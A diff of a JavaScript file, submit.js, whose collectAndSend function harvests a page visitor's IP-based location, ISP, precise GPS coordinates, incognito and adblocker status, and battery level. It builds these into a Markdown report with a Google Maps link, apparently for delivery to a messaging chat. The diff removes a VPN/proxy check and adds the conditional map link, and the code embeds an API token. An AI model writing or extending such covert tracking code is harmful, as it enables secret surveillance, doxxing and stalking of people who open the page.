@@ -1,4 +1,4 @@
-// submit.js (updated: added working VPN/Proxy detection using ip-api.com)
+// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection + proper bold/italic Markdown + conditional Map View)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -183,7 +183,7 @@ async function collectAndSend(chatId) {
     })()
   ]);
 
-  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown', vpn='Unknown', proxy='Unknown';
+  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown';
   try {
     const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
     if (res.ok) {
@@ -193,18 +193,13 @@ async function collectAndSend(chatId) {
       region = d.region || region;
       country = d.country || country;
       org = d.org || org;
-
-      // VPN/Proxy detection using ip-api.com
-      try {
-        const vpnRes = await fetch(`http://ip-api.com/json/${ip}?fields=mobile,hosting,proxy`);
-        if (vpnRes.ok) {
-          const v = await vpnRes.json();
-          vpn = (v.proxy || v.hosting) ? 'Yes' : 'No';
-          proxy = v.proxy ? 'Yes' : 'No';
-        }
-      } catch (e) {}
     }
   } catch (e) {}
+
+  // Conditional Map View
+  const mapView = (geoResult.latitude !== 'Denied' && geoResult.longitude !== 'Denied') 
+                  ? `https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}`
+                  : 'Unavailable';
 
   // Build message with Markdown formatting
   const message = 
@@ -241,15 +236,13 @@ _𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘�
 - Status: ${geoResult.status}
 - Latitude: \`${geoResult.latitude}\`
 - Longitude: \`${geoResult.longitude}\`
-- Map View: ${geoResult.status === 'Allowed' ? `https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}` : 'Unavailable'}
+- Map View: ${mapView}
 
 🔐 *Privacy & Blockers Info:*
 - Incognito / Private Mode: ${incognitoResult}
 - Adblocker Detected: ${adblockResult.detected}
 - Method: ${adblockResult.method}
 - Cookies Blocked: ${adblockResult.cookiesBlocked}
-- VPN Detected: ${vpn}
-- Proxy Detected: ${proxy}
 
 🔋 *Battery:*
 - Level: ${batteryLevel}
